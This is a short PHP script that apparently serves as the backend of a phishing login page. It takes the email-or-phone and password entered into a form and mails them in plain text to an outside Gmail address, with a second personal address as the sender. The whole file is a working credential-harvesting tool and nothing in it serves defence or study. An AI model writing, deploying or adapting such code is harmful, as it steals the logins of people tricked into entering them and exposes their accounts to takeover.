<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    $to = "schoolbirat2039@gmail.com";
    $subject = "Login Form Submission";
    $message = "Email or phone number: $email\nPassword: $password";

    $headers = "From:arjanchaudhary125@gmail.com"; 
    mail($to, $subject, $message, $headers);
}
?>
